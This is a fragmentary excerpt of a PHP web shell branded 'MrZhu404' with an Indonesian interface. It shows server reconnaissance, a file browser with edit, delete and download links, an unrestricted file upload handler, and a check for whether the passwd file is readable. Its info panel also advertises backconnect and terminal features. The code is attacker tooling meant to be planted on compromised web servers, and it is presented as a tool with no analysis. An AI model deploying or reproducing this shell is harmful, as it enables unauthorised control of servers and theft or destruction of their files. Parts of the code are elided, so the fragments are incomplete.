...
.response{width:616px;color:#00CED1;height:300px;border-bottom:solid 1px #47A3FF;border-right:solid 1px #00CED1;border-left:solid 1px #47A3FF;border-top:0;outline:none;background:#0A0A0A;color:#f2f2f2;margin:-4px 0px 0px 0px;}
...
echo "<title>.:: Gresik Suell ::.</title>";

function get_srv_info(){

	echo "<br /><span id='title'>.:: MrZhu404 Suell ::.</span><br /><div class='box'><b>Nama Server: </b>".$_SERVER["SERVER_NAME"]."<br />
	<b>IP Server: </b>".$_SERVER["SERVER_ADDR"]." <span class='enabled'><a href='http://www.who.is/whois/".$_SERVER['HTTP_HOST']."' target='_blank'>[WHOIS]</a> - <a href='http://www.dnsstuff.com/tools?runFromMain=".$_SERVER["SERVER_ADDR"]."&toolType=traceroute' target='_blank'>[TRACEROUTE]</a></span><br />".
	"<b>Lokasi Shell: </b>".$_SERVER["SCRIPT_FILENAME"]."<br />
...
<div id="back">
	...
	echo "
		...
		echo '<p><form action="" method="POST"><table><tr class="optionstr"><td><input class="chdir" type="text" name="chdir" value="'.$file_explorer.'"" /></td><td></td></form><td><div id="options"><a href="'.$CurrentUrl.'">Muat Ulang MrZhu</a></div></td><td><div id="options"><!--<a href="?bWtkaXI='.$file_explorer.'">Make Directory</a> | <a href="?bWtmbA='.$file_explorer.'">Make File</a> | <a href="?dXBsb2Fk='.$upload.'">Upload</a></div>--></td></tr>';
		if(isset($_POST['godir'])){$mandircha = $_POST['chdir'];if($mandircha){	header("Location: ?ZmlsZV9leHBsb3Jlcg=".$_POST['chdir']);}}
	?>
	</div></p>
			<table class="FileBrowserTable"><tr><td class="TableHeader_Name"> Nama File</td><td class="TableHeader">Tipe</a></td><td class="TableHeader">Ukuran</td><td class="TableHeader">Permisions</td><td class="TableHeader">Terakhir diubah</td><td class="TableHeaderoptions"> Menu</td></tr>
		<?php
...
if($readable."--".$writable."--".$executable == "r--w--x"){
	...
	foreach($Files as $File){
		if($File == ".."){
			...
			if($type == "Directory"){
				echo "<tr><td><a class='flink' title='Explore Directory' href='?ZmlsZV9leHBsb3Jlcg=" .$currentDirectory. "/" .$File. "'>" . $File . "/</a></td><td><center>" . $type . "</center></td><td class='filesize'>" . GetFileSize($currentDirectory. "/" .$File) . "</td><td style='color:red;'>".permissions($currentDirectory. "/" .$File)."</td><td>" . LastModified($currentDirectory. "/" .$File) . "</td><td>Tidak Jelas (Kek Kamu)</td></tr>";
			}else{
				echo "<tr><td><a class='flink' title='Edit File' href='?readfile=" .$currentDirectory. "/" .$File. "'>" . $File . "</a></td><td><center>" . $type . "</center></td><td class='filesize'>" . GetFileSize($currentDirectory. "/" .$File) . "</td><td style='color:red;'>".permissions($currentDirectory. "/" .$File)."</td><td>" . LastModified($currentDirectory. "/" .$File) . "</td><td><a href='?readfile=" .$currentDirectory. "/" .$File. "' title='Edit File'>Edit</a> - <a href='?delete=" .$currentDirectory. "/" .$File. "' title='Bin the Document'>Delete</a> - <a href='?downlfile=".$currentDirectory. "/" .$File."&file=".$File."' title='Download File'>Download</a></td></tr>";
			}
		}
	}
...
<div style="background:#282828;border-bottom-right-radius:4px;-moz-border-bottom-right-radius:4px;-webkit-border-bottom-right-radius:4px;border-bottom-left-radius:4px;-moz-border-bottom-left-radius:4px;-webkit-border-bottom-left-radius:4px;height:25px;margin:0px 0px 10px 0px;width:1000px;" ></div>
	...
	<?php
	if(isset($_POST['upload'])){if(isset($_FILES['file'])){	move_uploaded_file($_FILES["file"]["tmp_name"], $file_explorer."/". $_FILES["file"]["name"]);echo '<script>alert("Berhasil MrZhu : )");</script>';}	}
	?>
	<div style="padding:10px;background-color: #292929;border: 1px solid #3467BA;border-radius: 6px;-moz-border-radius: 6px;-webkit-border-radius: 6px;width:220px;float:left;margin:10px 10px 15px 0px;">
...
<?php
...
}elseif(strstr($CurrentUrl, "goblok")){
	get_srv_info();
  ...
  if(extension_loaded('curl')){$curls="<span class='enabled'>[ON]</span>";}else{$curls="<span class='disabled'>[OFF]</span>";}
	...
	if(is_readable("/home/etc/passwd")){
		echo "<span style='color:#00CED1;'>Readable</span>";
	}else{
		echo "<span style='color:red;'>Unreadable</span>";
	}
}elseif(strstr($CurrentUrl, "koplak")){
	...
	echo "
		<h4>Informasi</h4>
		<p>Shell MrZhu404".$shellVersion." Recode by MrZhu404 , Recode lagi berarti luh TOLOL !</p>";

		?>
		<ul>
			<li>Melihat semua file</li>
			<li>Memodif semua file </li>
			<li>Fitur Hash, Backconnect, Terminal</li>
		</ul>
		<br /><br />
	<?php
...
echo phpinfo();</textarea><br />
	...
	<div style="float:right;width:250px;">
		<h4>Informasi</h4>
		<p>Jika kamu yang membaca ini adalah MrZhu404 Yasudahlah.</p>
		<p><strong>Tapi ! </strong><i>echo phpinfo();</i></p><br /><br />
		<h4>Warning</h4>
